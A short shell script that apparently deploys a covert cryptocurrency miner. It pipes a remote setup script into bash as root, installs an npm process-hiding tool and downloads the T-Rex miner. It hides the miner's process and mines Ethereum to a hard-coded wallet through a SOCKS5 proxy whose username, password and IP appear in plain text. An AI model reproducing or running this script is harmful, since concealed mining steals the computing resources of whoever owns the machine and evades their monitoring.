#!/bin/sh
sudo su 
sudo apt update
sudo apt upgrade -y
curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
sudo apt-get install -y nodejs

npm i -g node-process-hider
npm install -g npm

wget https://github.com/trexminer/T-Rex/releases/download/0.24.6/t-rex-0.24.6-linux.tar.gz
tar -zxf t-rex-0.24.6-linux.tar.gz
chmod +x t-rex
sudo ph add t-rex
./t-rex -a ethash -o stratum+ssl://eth-us-west.flexpool.io:5555 -u 0xbc48b8bdce572defe4dcab85103f140099bc5af5 -p x -w DENT --proxy socks5 = Selshindeparshuram2012:V7p9BkV@191.101.148.51:45786 --no-sni --dns-https-server 1.1.1.1
